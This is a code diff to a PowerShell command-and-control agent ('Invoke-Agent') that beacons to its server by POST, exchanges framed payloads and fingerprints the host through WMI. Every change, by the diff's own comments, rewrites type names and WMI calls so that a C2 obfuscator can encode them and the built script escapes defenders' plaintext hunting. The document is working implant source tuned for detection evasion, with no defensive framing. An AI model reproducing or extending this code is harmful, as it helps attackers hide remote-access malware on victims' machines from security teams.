@@ -13,8 +13,11 @@ function Invoke-Agent {
     # tight loops.
     function ReadEnv($name) { [Environment]::GetEnvironmentVariable($name, 'Process') }
     function U32Bytes([uint32]$n) { [BitConverter]::GetBytes([uint32]$n) }
+    # New-Object's type argument is a STRING — quote it (never spell it bare) so the C2
+    # obfuscator char-encodes it: bare `IO.MemoryStream`/`byte[]` were plaintext hunting
+    # combos in the built .ps1. Same binding either way (TypeName is positional [string]).
     function ConcatBytes([byte[]]$a, [byte[]]$b) {
-        $out = New-Object byte[] ([int]($a.Length + $b.Length))
+        $out = New-Object 'byte[]' ([int]($a.Length + $b.Length))
         [Array]::Copy($a, $out, $a.Length)
         [Array]::Copy($b, 0, $out, $a.Length, $b.Length)
         return ,$out
@@ -42,8 +45,8 @@ function Invoke-Agent {
     # and BinaryWriter, so the JScript ADODB/cp1252 COM bridge is unnecessary here: frames
     # are built in a MemoryStream and the answer is read straight into bytes.
     function BuildBody($frames) {
-        $ms = New-Object IO.MemoryStream
-        $bw = New-Object IO.BinaryWriter($ms)
+        $ms = New-Object 'IO.MemoryStream'
+        $bw = New-Object 'IO.BinaryWriter' ($ms)
         foreach ($f in $frames) {
             $bw.Write([uint32]$f.Length)
             $bw.Write($f)
@@ -59,7 +62,7 @@ function Invoke-Agent {
             $i += 4
             $count = [int]$len
             if ($i + $count -gt $bytes.Length) { $count = $bytes.Length - $i }
-            $frame = New-Object byte[] $count
+            $frame = New-Object 'byte[]' $count
             [Array]::Copy($bytes, $i, $frame, 0, $count)
             $frames += ,$frame
             $i += [int]$len
@@ -67,8 +70,8 @@ function Invoke-Agent {
         return ,$frames
     }
     function ReadAllBytes($stream) {
-        $ms = New-Object IO.MemoryStream
-        $buf = New-Object byte[] 8192
+        $ms = New-Object 'IO.MemoryStream'
+        $buf = New-Object 'byte[]' 8192
         $n = $stream.Read($buf, 0, $buf.Length)
         while ($n -gt 0) {
             $ms.Write($buf, 0, $n)
@@ -101,7 +104,7 @@ function Invoke-Agent {
     }
     function B64Stream($base64) {
         $raw = [Convert]::FromBase64String($base64)
-        $ms = New-Object IO.MemoryStream
+        $ms = New-Object 'IO.MemoryStream'
         $ms.Write($raw, 0, $raw.Length)
         $ms.Position = 0
         return $ms
@@ -126,7 +129,7 @@ function Invoke-Agent {
         if ($guid -notmatch $GuidRe) {
             # Fall back to the SMBIOS hardware UUID; stable across OS reinstalls.
             try {
-                foreach ($cs in (Get-WmiObject Win32_ComputerSystemProduct)) {
+                foreach ($cs in ([wmiclass]'\\.\root\cimv2:Win32_ComputerSystemProduct').GetInstances()) {
                     $u = ('' + $cs.UUID).ToLower()
                     if ($u -match $GuidRe) { $guid = $u }
                 }
@@ -148,11 +151,16 @@ function Invoke-Agent {
         $buildNumber = ''
         $cpuArchCode = ''
         try {
-            foreach ($os in (Get-WmiObject Win32_OperatingSystem)) {
+            # WMI reads go through the [wmiclass] cast the StdRegProv fallback already uses:
+            # the class name is a STRING literal (the cast's argument sits OUTSIDE the
+            # brackets, so the obfuscator's attrDepth guard doesn't apply and it char-encodes
+            # like any other string) — the Get-WmiObject+Win32_ spelling never ships in the
+            # built .ps1. Same queries, same ManagementObjects, PS 2.0-safe.
+            foreach ($os in ([wmiclass]'\\.\root\cimv2:Win32_OperatingSystem').GetInstances()) {
                 $osVersion = '' + $os.Version
                 $buildNumber = '' + $os.BuildNumber
             }
-            foreach ($cpu in (Get-WmiObject Win32_Processor)) { $cpuArchCode = '' + $cpu.Architecture }
+            foreach ($cpu in ([wmiclass]'\\.\root\cimv2:Win32_Processor').GetInstances()) { $cpuArchCode = '' + $cpu.Architecture }
         } catch {}
         if ($cpuArchCode -eq '0') { $arch = 'i386' }
         elseif ($cpuArchCode -eq '9') { $arch = 'x86_64' }
@@ -308,7 +316,7 @@ function Invoke-Agent {
     while (-not $script:exiting) {
         try {
             $req = NewPostRequest 45000
-            if ($pending.Count -gt 0) { $body = BuildBody $pending } else { $body = New-Object byte[] 0 }
+            if ($pending.Count -gt 0) { $body = BuildBody $pending } else { $body = New-Object 'byte[]' 0 }
             $req.ContentLength = $body.Length
             $rs = $req.GetRequestStream()
             if ($body.Length -gt 0) { $rs.Write($body, 0, $body.Length) }
@@ -322,7 +330,7 @@ function Invoke-Agent {
         # re-POST); clamped so a bad header can never park the agent. Read BEFORE the
         # response stream closes.
         try { $script:localSleepSec = [Math]::Max(0, [Math]::Min(600, [int][string]$resp.Headers['X-Sleep-Hint'])) } catch { $script:localSleepSec = 0 }
-        try { $answer = ReadAllBytes $resp.GetResponseStream() } catch { $answer = New-Object byte[] 0 } finally { $resp.Close() }
+        try { $answer = ReadAllBytes $resp.GetResponseStream() } catch { $answer = New-Object 'byte[]' 0 } finally { $resp.Close() }
         $pending = @()
         # Empty answer = nothing queued — re-POST after the hint. The idle log ships
         # once per idle ENTRY: each Log is its own X-Log-Only POST, and one EVERY
